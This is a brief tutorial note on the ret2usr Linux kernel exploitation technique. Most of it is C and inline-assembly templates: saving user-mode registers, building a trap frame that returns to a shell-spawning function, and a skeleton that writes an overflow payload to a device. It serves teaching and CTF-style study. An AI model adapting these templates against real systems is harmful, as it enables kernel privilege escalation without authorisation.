# ret2usr - Return to user

## Theory
ret2usr attacks, is a technique used in kernel land, allowing the return in userland in order to obtain finally arbitrary code execution because we control everything in userland.
To make a complete ret2usr it is necessary to use a function called iretq or iretd which will make a kernel interrupt in order to go in userland, for that the function needs to save the state of the current memory registers: `RIP|CS|RFLAGS|SP|SS`. It is also necessary to swap the segment gs an instruction is able to do it: `swapgs`
## Practice
64BITS:
```C
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}
```
32BITS:
```C
struct trap_frame {
    void * eip ;          // instruction pointer
    uint32_t cs ;        // code segment
    uint32_t eflags ;   // CPU flags
    void * esp ;       // stack pointer
    uint32_t ss ;     // stack segment
} __attribute__((packed));

struct trap_frame tf;

void prepare_tf(void)
{
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &spawn_shell_function;
    tf.esp -= 1024;         // unused part of stack
}
```
The overall scheme as follows:
```C
int main(void)
{
    unsigned char payload[] =
    "aaaaaaaaaaaaaaaaa.....\xef\xbe\xad\xde" // flow redirect

    open_fd();
    save_state(); // or prepare_tf() in 32bits
    write(fd, payload, sizeof(payload));
}
```

## References
**EN**
 - [https://defaultsec.eu/articles/linux-kernel-exploit#ret2usr](https://defaultsec.eu/articles/Articles%20b670077918604977ab9c1314f698cab5/Linux%20Kernel%20Exploitation%20fbaef51c6910418a92220e950a2bfac5/Linux%20Kernel%20Exploitation%20-%20BOF%20(part1)%20577c70e663db4cd7a4fd6e96de1321af.html#46af5236-e60c-4583-83bf-08346a5a36e2)
 - https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-simplest-exploit---ret2usr

